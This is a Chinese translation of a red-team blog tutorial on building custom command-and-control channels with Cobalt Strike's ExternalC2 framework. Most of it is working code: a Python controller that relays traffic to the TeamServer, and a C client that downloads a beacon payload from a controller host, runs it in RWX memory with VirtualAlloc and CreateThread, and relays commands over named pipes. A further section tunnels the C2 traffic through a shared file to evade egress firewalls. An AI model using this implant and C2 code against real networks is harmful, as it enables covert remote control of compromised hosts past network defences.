> 原文链接: https://www.anquanke.com//post/id/103395 


# 一起探索Cobalt Strike的ExternalC2框架


                                阅读量   
                                **99990**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者xpn，文章来源：blog.xpnsec.com
                                <br>原文地址：[https://blog.xpnsec.com/exploring-cobalt-strikes-externalc2-framework/](https://blog.xpnsec.com/exploring-cobalt-strikes-externalc2-framework/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t01e9c857a73e470246.jpg)](https://p4.ssl.qhimg.com/t01e9c857a73e470246.jpg)



## 一、前言

许多测试人员都知道，有时候想顺利实现C2通信是非常折磨人的一件事情。随着出站防火墙规则以及进程限制机制的完善，反弹式shell以及反弹式HTTP C2通道的好日子已经一去不复返。

好吧，也许我的描述略微夸张了一点，但现在形势的确没有那么乐观了。因此我想寻找实现C2通信的其他可行方法，最后我找到了Cobalt Strike的ExternalC2框架。



## 二、ExternalC2

ExternalC2是Cobalt Strike引入的一种规范（或者框架），黑客可以利用这个功能拓展C2通信渠道，而不局限于默认提供的HTTP(S)/DNS/SMB通道。大家可以参考[此处](https://www.cobaltstrike.com/downloads/externalc2spec.pdf)下载完整的规范说明。

简而言之，用户可以使用这个框架来开发各种组件，包括如下组件：

1、第三方控制端（Controller）：负责连接Cobalt Strike TeamServer，并且能够使用自定义的C2通道与目标主机上的第三方客户端（Client）通信。

2、第三方客户端（Client）：使用自定义C2通道与第三方Controller通信，将命令转发至SMB Beacon。

3、SMB Beacon：在受害者主机上执行的标准beacon。

从CS提供的官方文档中，我们可以看到如下示意图：

[![](https://p3.ssl.qhimg.com/t0149339238feb151e3.png)](https://p3.ssl.qhimg.com/t0149339238feb151e3.png)

从上图可知，我们的自定义C2通道两端分别为第三方Controller以及第三方Client，这两个角色都是我们可以研发以及控制的角色。

在撸起袖子进入正题之前，我们需要理解如何与Team Server的ExternalC2接口交互。

首先，我们需要让Cobalt Strike启动ExternalC2。我们可以使用`externalc2_start`函数，传入端口参数即可。一旦ExternalC2服务顺利启动并正常运行，我们需要使用自定义的协议进行通信。

这个协议其实非常简单直白，由4字节的长度字段（低字节序）以及一个数据块所组成，如下所示：

[![](https://p4.ssl.qhimg.com/t0167a253c33043b713.png)](https://p4.ssl.qhimg.com/t0167a253c33043b713.png)

开始通信时，第三方Controller与TeamServer建连，然后发送一些选项，如：

1、arch：待使用的beacon的架构（x86或x64）。

2、pipename：用来与beacon通信的管道（pipe）的名称。

3、block：TeamServer各任务之间的阻塞时间（以毫秒为单位）。

所有选项发送完毕后，Controller会发送一条 `go`指令。这条指令可以启动ExternalC2通信，生成并发送beacon。Controller随后会将这个SMB beacon载荷转发给Client，后者需要生成SMB beacon。

一旦在受害者主机上生成了SMB beacon，我们就需要建立连接来传输命令。我们可以使用命名管道完成这个任务，并且Client与SMB Beacon所使用的通信协议与Client及Controller之间的协议完全一致，也是4字节的长度字段（低字节序）再跟上一段数据。

理论方面就是这样，接下来我们可以举一个典型案例，在网络中转发通信数据。



## 三、典型案例

这个案例中，我们在服务端使用Python来实现第三方Controller功能，在客户端使用C来实现第三方Client功能。

首先，使用如下语句，让Cobalt Strike启用ExternalC2：

```
# start the External C2 server and bind to 0.0.0.0:2222
externalc2_start("0.0.0.0", 2222);
```

该语句执行完毕后，ExternalC2会在`0.0.0.0:2222`监听请求。

现在ExternalC2已经启动并处于运行状态，我们可以来构建自己的Controller。

首先，连接至TeamServer的ExternalC2接口：

```
_socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
_socketTS.connect(("127.0.0.1", 2222))
```

连接建立成功后，我们需要发送选项信息。我们可以构建一些辅助函数，计算4字节长度字段值，这样就不需要每次手动计算这个值：

```
def encodeFrame(data):
    return struct.pack("&lt;I", len(data)) + data

def sendToTS(data):
    _socketTS.sendall(encodeFrame(data))
```

接下来我们就可以使用这些辅助函数来发送选项：

```
# Send out config options
    sendToTS("arch=x86")
    sendToTS(“pipename=xpntest")
    sendToTS("block=500")
    sendToTS("go")

```

选项发送完毕后，Cobalt Strike就知道我们需要一个x86 SMB Beacon。此外，我们还需要正确接受数据，可以再创建一些辅助函数，负责报文的解码工作，这样就不用每次都去手动解码：

```
def decodeFrame(data):
    len = struct.unpack("&lt;I", data[0:3])
    body = data[4:]
    return (len, body)

def recvFromTS():
    data = ""
    _len =  _socketTS.recv(4)
    l = struct.unpack("&lt;I",_len)[0]
    while len(data) &lt; l:
        data += _socketTS.recv(l - len(data))
    return data
```

这样我们就可以使用如下语句接收原始数据：

```
data = recvFromTS()
```

接下来我们需要让第三方Client使用我们选择的C2协议与我们连接。这个例子中，我们的C2通道协议使用的是相同的4字节的长度字段数据包格式。因此，我们需要创建一个socket，方便第三方Client连接过来：

```
_socketBeacon = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
    _socketBeacon.bind(("0.0.0.0", 8081))
    _socketBeacon.listen(1)
    _socketClient = _socketBeacon.accept()[0]
```

收到连接后，我们进入循环收发处理流程，接受来自受害者主机的数据，将数据转发至Cobalt Strike，然后接受Cobalt Strike返回的数据，将其转发至受害者主机：

```
while(True):
        print "Sending %d bytes to beacon" % len(data)
        sendToBeacon(data)

        data = recvFromBeacon()
        print "Received %d bytes from beacon" % len(data)

        print "Sending %d bytes to TS" % len(data)
        sendToTS(data)

        data = recvFromTS()
        print "Received %d bytes from TS" % len(data)
```

请参考[此处](https://gist.github.com/xpn/bb82f2ca4c8e9866c12c54baeb64d771)获取完整的代码。

Controller已构造完毕，现在我们需要创建第三方Client。为了创建起来方便一些，我们可以使用 `win32`以及C来完成这个任务，这样就可以较方便地使用Windows的原生API。还是先来看看如何创建辅助函数，首先我们需要连接到第三方Controller，可以使用WinSock2创建与Controller的TCP连接：

```
// Creates a new C2 controller connection for relaying commands
SOCKET createC2Socket(const char *addr, WORD port) `{`
    WSADATA wsd;
    SOCKET sd;
    SOCKADDR_IN sin;
    WSAStartup(0x0202, &amp;wsd);

    memset(&amp;sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.S_un.S_addr = inet_addr(addr);

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    connect(sd, (SOCKADDR*)&amp;sin, sizeof(sin));

    return sd;
`}`
```

然后我们需要接收数据。这个过程与Python代码中的流程类似，可以通过长度字段的值来知道需要接收的数据长度：

```
// Receives data from our C2 controller to be relayed to the injected beacon
char *recvData(SOCKET sd, DWORD *len) `{`
    char *buffer;
    DWORD bytesReceived = 0, totalLen = 0;

    *len = 0;

    recv(sd, (char *)len, 4, 0);
    buffer = (char *)malloc(*len);

    if (buffer == NULL)
        return NULL;

    while (totalLen &lt; *len) `{`
            bytesReceived = recv(sd, buffer + totalLen, *len - totalLen, 0);
            totalLen += bytesReceived;
    `}`
    return buffer;
`}`
```

与之前类似，我们需要将数据通过C2通道返回给Controller：

```
// Sends data to our C2 controller received from our injected beacon
void sendData(SOCKET sd, const char *data, DWORD len) `{`
    char *buffer = (char *)malloc(len + 4);
    if (buffer == NULL):
        return;

    DWORD bytesWritten = 0, totalLen = 0;

    *(DWORD *)buffer = len;
    memcpy(buffer + 4, data, len);

    while (totalLen &lt; len + 4) `{`
            bytesWritten = send(sd, buffer + totalLen, len + 4 - totalLen, 0);
            totalLen += bytesWritten;
    `}`
    free(buffer);
`}`
```

现在我们已经可以与Controller通信，接下来第一要务就是接收beacon载荷。载荷为x86或者x64载荷（具体架构由Controller发送给Cobalt Strike的选项所决定），在执行之前需要复制到内存中。比如，我们可以使用如下语句接收beacon载荷：

```
// Create a connection back to our C2 controller
SOCKET c2socket = createC2Socket("192.168.1.65", 8081);
payloadData = recvData(c2socket, &amp;payloadLen);
```

在这个案例中，我们可以使用Win32的`VirtualAlloc`函数来分配一段可执行的内存空间，使用`CreateThread`来执行代码：

```
HANDLE threadHandle;
DWORD threadId = 0;

char *alloc = (char *)VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
if (alloc == NULL)
    return;

memcpy(alloc, payload, len);

threadHandle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, &amp;threadId);
```

一旦SMB Beacon启动并处于运行状态，我们需要连接到beacon的命名管道，因此我们不断尝试连接至我们的`\.pipexpntest`管道（请注意：前面我们已经通过选项信息向Cobalt Strike传递了管道名称，SMB Beacon会使用这个名称来接收命令）：

```
// Loop until the pipe is up and ready to use
while (beaconPipe == INVALID_HANDLE_VALUE) `{`
        // Create our IPC pipe for talking to the C2 beacon
        Sleep(500);
        beaconPipe = connectBeaconPipe("\\.\pipe\xpntest");
`}`
```

连接成功后，我们可以进入数据收发循环处理流程：

```
while (true) `{`
    // Start the pipe dance
    payloadData = recvFromBeacon(beaconPipe, &amp;payloadLen);
    if (payloadLen == 0) break;

    sendData(c2socket, payloadData, payloadLen);
    free(payloadData);

    payloadData = recvData(c2socket, &amp;payloadLen);
    if (payloadLen == 0) break;

    sendToBeacon(beaconPipe, payloadData, payloadLen);
    free(payloadData);
`}`
```

基本步骤就这样，我们已经了解了创建ExternalC2服务的基本要素，大家可以参考[此处](https://gist.github.com/xpn/08cf7001780020bb60c5c773cec5f839)获取完整的Client代码。

现在我们可以来看看更加有趣的东西。



## 四、通过文件传输C2数据

先回顾下创建自定义C2协议中我们需要控制哪些元素：

[![](https://p4.ssl.qhimg.com/t011681657b66dab389.png)](https://p4.ssl.qhimg.com/t011681657b66dab389.png)

从上图可知，我们需要重点关注第三方Controller以及Client之间传输的数据。还是回到之前那个例子，现在我们需要将这个过程变得更加有趣，那就是通过文件读写操作来传输数据。

为什么要费尽心思这么做呢？当我们身处Windows域环境中，所控制的主机只有非常有限的外连渠道（比如只能访问文件共享），这时候就需要用到这种方法。当某台主机（Internet Connected Host）既能访问我们的C2服务器，也能通过SMB文件共享方式与受害主机建连时，我们可以将C2数据写入共享的某个文件，然后再穿过防火墙读取这些数据，这样就能运行我们的Cobalt Strike beacon。

整个流程如下所示：

[![](https://p4.ssl.qhimg.com/t01ecadd208bd5cd64d.png)](https://p4.ssl.qhimg.com/t01ecadd208bd5cd64d.png)

上图中我们引入了一个附加的元素，可以将数据封装到文件中进行读写，并且也可以与第三方Controller通信。

与前面类似，这里Controller与“Internet Connected Host”同样使用长度字段为4字节的协议来通信，因此我们不需要修改已有的Python版的Controller。

我们需要做的是将前面的Client分割成两个部分。第一部分在“Internet Connected Host”上运行，接收Controller发送的数据，将其写入某个文件中。第二部分在“Restricted Host”（受限主机）上运行，读取文件中的数据，生成SMB Beacon，并将数据传递给这个beacon。

前面介绍过的部分这里就不再赘述了，我来介绍下实现文件传输的一种方法。

首先，我们需要创建承担通信功能的文件。这里我们可以使用`CreateFileA`函数，但需要确保使用`FILE_SHARE_READ`以及`FILE_SHARE_WRITE`选项。这样通道两端的Client就能同时读取并写入这个文件：

```
HANDLE openC2FileServer(const char *filepath) `{`
    HANDLE handle;

    handle = CreateFileA(filepath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (handle == INVALID_HANDLE_VALUE)
        printf("Error opening file: %xn", GetLastError());
    return handle;
`}`
```

接下来，我们需要将C2数据序列化封装到文件中，同时指定2个Client中哪个Client需要在什么时候处理数据。

我们可以使用一个简单的头部结构来完成这个任务，如下所示：

```
struct file_c2_header `{`
    DWORD id;
    DWORD len;
`}`;
```

头部中的`id`字段可以充当信号功能，我们根据这个字段了解哪个Client需要读取或写入数据。

再引入两个文件读取及写入函数，如下所示：

```
void writeC2File(HANDLE c2File, const char *data, DWORD len, int id) `{`
  char *fileBytes = NULL;
  DWORD bytesWritten = 0;

  fileBytes = (char *)malloc(8 + len);
  if (fileBytes == NULL)
      return;

  // Add our file header
  *(DWORD *)fileBytes = id;
  *(DWORD *)(fileBytes+4) = len;

  memcpy(fileBytes + 8, data, len);

  // Make sure we are at the beginning of the file
  SetFilePointer(c2File, 0, 0, FILE_BEGIN);

  // Write our C2 data in
  WriteFile(c2File, fileBytes, 8 + len, &amp;bytesWritten, NULL);

  printf("[*] Wrote %d bytesn", bytesWritten);
`}`

char *readC2File(HANDLE c2File, DWORD *len, int expect) `{`
  char header[8];
  DWORD bytesRead = 0;
  char *fileBytes = NULL;

  memset(header, 0xFF, sizeof(header));

  // Poll until we have our expected id in the header
  while (*(DWORD *)header != expect) `{`
    SetFilePointer(c2File, 0, 0, FILE_BEGIN);
    ReadFile(c2File, header, 8, &amp;bytesRead, NULL);
    Sleep(100);
  `}`

  // Read out the expected length from the header
  *len = *(DWORD *)(header + 4);
  fileBytes = (char *)malloc(*len);
  if (fileBytes == NULL)
      return NULL;

  // Finally, read out our C2 data
  ReadFile(c2File, fileBytes, *len, &amp;bytesRead, NULL);
  printf("[*] Read %d bytesn", bytesRead);
  return fileBytes;
`}`
```

上述代码中，我们将头部信息写入文件中，然后根据这个信息相应地读取或写入C2数据。

主要工作就是这样，接下来我们需要实现接收数据/写入数据/读取数据/发送数据循环逻辑，这样就能通过文件传输实现C2数据通信。

大家可以访问[此处](https://gist.github.com/xpn/53003cd6278eb6e8f472ddac54a4c3ea)获取完整的Controller代码，演示视频如下所示：

[http://v.youku.com/v_show/id_XMzUwNzMxOTIyNA==.html](http://v.youku.com/v_show/id_XMzUwNzMxOTIyNA==.html)

如果大家还想深入学习ExternalC2的相关知识，可以访问Cobalt Strike的[ExternalC2帮助页面](https://www.cobaltstrike.com/help-externalc2)获取各种参考资料。
